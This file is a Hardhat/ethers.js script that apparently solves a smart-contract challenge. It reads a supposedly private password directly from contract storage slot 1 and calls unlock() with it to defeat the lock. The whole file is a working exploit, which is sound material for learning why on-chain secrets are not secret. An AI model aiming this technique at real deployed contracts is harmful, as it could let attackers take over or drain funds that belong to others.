const hardhat = require('hardhat');
const ethers = hardhat.ethers;

const INSTANCE_ADDRESS = '0x7314aDE3b5Df3Ba4dF74F5465E7520968D3a317D';

const abi = [
    'function locked() public view returns (bool)',
    'function unlock(bytes32 _password) public',
];

const main = async () => {
    const target = await ethers.getContractAt(abi, INSTANCE_ADDRESS);

    console.log('Fetching initial locked state...');
    let isLocked = await target.locked();
    console.log(`Initial locked state is: ${isLocked}`);

    console.log('Fetching private password...');
    const password = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 1);
    console.log(`Private password is ${password}`);

    console.log('Exploiting contract...');
    const tx = await target.unlock(password);
    await tx.wait();

    console.log('Fetching new lock state.');
    isLocked = await target.locked();
    console.log(`Final locked state is: ${isLocked}`);
};

main();
